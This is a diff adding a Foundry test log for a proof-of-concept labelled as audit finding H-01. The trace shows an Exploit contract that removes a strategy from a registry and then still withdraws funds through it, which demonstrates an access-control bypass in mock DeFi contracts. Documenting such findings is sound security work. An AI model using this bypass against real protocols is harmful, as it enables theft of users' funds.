@@ -1,0 +1,67 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/64014-h-01-removed-strategy-bypass-removal-block-withdrawals_exp.sol:PoC_64014
+[PASS] test_removed_strategy_still_called_after_registry_delete() (gas: 1374145)
+Traces:
+  [1413945] PoC_64014::test_removed_strategy_still_called_after_registry_delete()
+    ├─ [1289536] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [196836] → new StrategyRegistry@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 983 bytes of code
+    │   ├─ [118555] → new SingleAssetStrategy@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 100
+    │   │   └─ ← [Return] 480 bytes of code
+    │   ├─ [320493] → new PrimeStrategy@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 1488 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 2: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 2445 bytes of code
+    ├─ [80266] Exploit::run()
+    │   ├─ [23273] StrategyRegistry::addStrategy(SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x28c18e4882aeea099549551b7e2a669cb42cb29108aa24026a32b42c4ca60370: 0 → 256
+    │   │   └─ ← [Stop]
+    │   ├─ [22659] PrimeStrategy::setPriority(SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   └─ ← [Stop]
+    │   ├─ [1088] StrategyRegistry::removeStrategy(SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x28c18e4882aeea099549551b7e2a669cb42cb29108aa24026a32b42c4ca60370: 256 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [4941] PrimeStrategy::withdraw(100)
+    │   │   ├─ [1267] StrategyRegistry::strategies(SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   │   └─ ← [Return] 0, false
+    │   │   ├─ [1148] SingleAssetStrategy::withdraw(100)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 100 → 0
+    │   │   │   └─ ← [Return] 100
+    │   │   └─ ← [Return] 100
+    │   ├─ [1267] StrategyRegistry::strategies(SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   └─ ← [Return] 0, false
+    │   ├─  storage changes:
+    │   │   @ 3: 0 → 100
+    │   └─ ← [Stop]
+    ├─ [403] Exploit::withdrawnAfterRemoval() [staticcall]
+    │   └─ ← [Return] 100
+    ├─ [0] VM::assertEq(100, 100) [staticcall]
+    │   └─ ← [Return]
+    ├─ [681] Exploit::registry() [staticcall]
+    │   └─ ← [Return] StrategyRegistry: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [704] Exploit::strategy() [staticcall]
+    │   └─ ← [Return] SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [1267] StrategyRegistry::strategies(SingleAssetStrategy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   └─ ← [Return] 0, false
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertFalse(false) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.40ms (2.06ms CPU time)
+
+Ran 1 test suite in 58.40ms (18.40ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
